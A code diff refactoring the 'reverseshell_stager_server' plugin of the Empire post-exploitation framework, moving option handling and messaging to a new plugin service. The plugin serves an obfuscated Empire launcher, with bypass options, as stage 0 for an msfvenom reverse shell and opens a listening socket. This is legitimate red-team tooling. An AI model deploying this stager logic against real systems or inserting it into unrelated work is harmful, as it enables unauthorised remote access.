@@ -4,16 +4,20 @@ import socket
 
 import empire.server.common.helpers as helpers
 from empire.server.common.plugins import Plugin
+from empire.server.core.plugin_service import PluginService
 
 
 class Plugin(Plugin):
-    description = "Empire reverseshell stager server plugin."
-
     def onLoad(self):
-        print(helpers.color("[*] Loading Empire reverseshell server plugin"))
         self.info = {
             "Name": "reverseshell_stager_server",
-            "Author": ["@Cx01N"],
+            "Authors": [
+                {
+                    "Name": "Anthony Rose",
+                    "Handle": "@Cx01N",
+                    "Link": "https://twitter.com/Cx01N_",
+                }
+            ],
             "Description": (
                 "Server for reverseshell using msfvenom to act as a stage 0."
             ),
@@ -115,12 +119,12 @@ class Plugin(Plugin):
     def execute(self, command):
         try:
             self.reverseshell_proc = None
-            self.status = self.options["Status"]["Value"]
-            results = self.do_server("")
+            self.status = command["Status"]
+            results = self.do_server(command)
             return results
         except Exception as e:
             print(e)
-            self.main_menu.plugin_socketio_message(self.info[0]["Name"], f"[!] {e}")
+            self.plugin_service.plugin_socketio_message(self.info[0]["Name"], f"[!] {e}")
             return False
 
     def get_commands(self):
@@ -131,11 +135,11 @@ class Plugin(Plugin):
         any modifications to the mainMenu go here - e.g.
         registering functions to be run by user commands
         """
-        mainMenu.__class__.do_server = self.do_server
         self.installPath = mainMenu.installPath
         self.main_menu = mainMenu
+        self.plugin_service: PluginService = mainMenu.pluginsv2
 
-    def do_server(self, *args):
+    def do_server(self, command):
         """
         Check if the Empire C# server is already running.
         """
@@ -146,39 +150,39 @@ class Plugin(Plugin):
 
         if self.status == "status":
             if self.enabled:
-                self.main_menu.plugin_socketio_message(
+                self.plugin_service.plugin_socketio_message(
                     self.info["Name"], "[+] Reverseshell server is currently running"
                 )
             else:
-                self.main_menu.plugin_socketio_message(
+                self.plugin_service.plugin_socketio_message(
                     self.info["Name"], "[!] Reverseshell server is currently stopped"
                 )
 
         elif self.status == "stop":
             if self.enabled:
                 self.reverseshell_proc.kill()
-                self.main_menu.plugin_socketio_message(
+                self.plugin_service.plugin_socketio_message(
                     self.info["Name"], "[!] Stopped reverseshell server"
                 )
             else:
-                self.main_menu.plugin_socketio_message(
+                self.plugin_service.plugin_socketio_message(
                     self.info["Name"], "[!] Reverseshell server is already stopped"
                 )
 
         elif self.status == "start":
             # extract all of our options
-            language = self.options["Language"]["Value"]
-            listener_name = self.options["Listener"]["Value"]
-            base64 = self.options["Base64"]["Value"]
-            obfuscate = self.options["Obfuscate"]["Value"]
-            obfuscate_command = self.options["ObfuscateCommand"]["Value"]
-            user_agent = self.options["UserAgent"]["Value"]
-            proxy = self.options["Proxy"]["Value"]
-            proxy_creds = self.options["ProxyCreds"]["Value"]
-            stager_retries = self.options["StagerRetries"]["Value"]
-            safe_checks = self.options["SafeChecks"]["Value"]
-            lhost = self.options["LocalHost"]["Value"]
-            lport = self.options["LocalPort"]["Value"]
+            language = command["Language"]
+            listener_name = command["Listener"]
+            base64 = command["Base64"]
+            obfuscate = command["Obfuscate"]
+            obfuscate_command = command["ObfuscateCommand"]
+            user_agent = command["UserAgent"]
+            proxy = command["Proxy"]
+            proxy_creds = command["ProxyCreds"]
+            stager_retries = command["StagerRetries"]
+            safe_checks = command["SafeChecks"]
+            lhost = command["LocalHost"]
+            lport = command["LocalPort"]
 
             encode = False
             if base64.lower() == "true":
@@ -194,17 +198,17 @@ class Plugin(Plugin):
                 language=language,
                 encode=encode,
                 obfuscate=invoke_obfuscation,
-                obfuscationCommand=obfuscate_command,
+                obfuscation_command=obfuscate_command,
                 userAgent=user_agent,
                 proxy=proxy,
                 proxyCreds=proxy_creds,
                 stagerRetries=stager_retries,
                 safeChecks=safe_checks,
-                bypasses=self.options["Bypasses"]["Value"],
+                bypasses=command["Bypasses"],
             )
 
             if self.launcher == "":
-                self.main_menu.plugin_socketio_message(
+                self.plugin_service.plugin_socketio_message(
                     self.info["Name"], "[!] Error in launcher command generation."
                 )
                 return ""
@@ -242,7 +246,7 @@ class Plugin(Plugin):
         except:
             return f"[!] Can't bind at {host}:{port}"
 
-        self.main_menu.plugin_socketio_message(
+        self.plugin_service.plugin_socketio_message(
             self.info["Name"], "[*] Listening on %s ..." % port
         )
         server.listen(5)
